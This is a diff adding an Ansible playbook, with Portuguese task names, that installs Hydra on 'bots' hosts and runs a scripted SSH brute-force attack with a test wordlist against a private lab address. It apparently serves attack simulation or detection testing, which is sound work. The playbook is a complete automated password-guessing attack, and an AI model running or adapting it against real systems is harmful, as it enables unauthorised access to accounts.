@@ -1,0 +1,25 @@
+- name: Simular ataque brute-force SSH com Hydra
+  hosts: bots
+  become: yes
+  vars:
+    alvo_ip: 172.28.0.10
+    usuario: ansible
+    wordlist: /tmp/senha_teste.txt
+  tasks:
+    - name: Instalar Hydra
+      apt:
+        name: hydra
+        state: present
+        update_cache: yes
+
+    - name: Copiar wordlist de senhas
+      copy:
+        src: ../wordlists/senha_teste.txt
+        dest: "{{ wordlist }}"
+        mode: '0644'
+
+    - name: Executar ataque brute-force via Hydra
+      shell: >
+        hydra -l {{ usuario }} -P {{ wordlist }} ssh://{{ alvo_ip }} -t 4 -o /tmp/hydra_resultados.txt
+      args:
+        warn: false
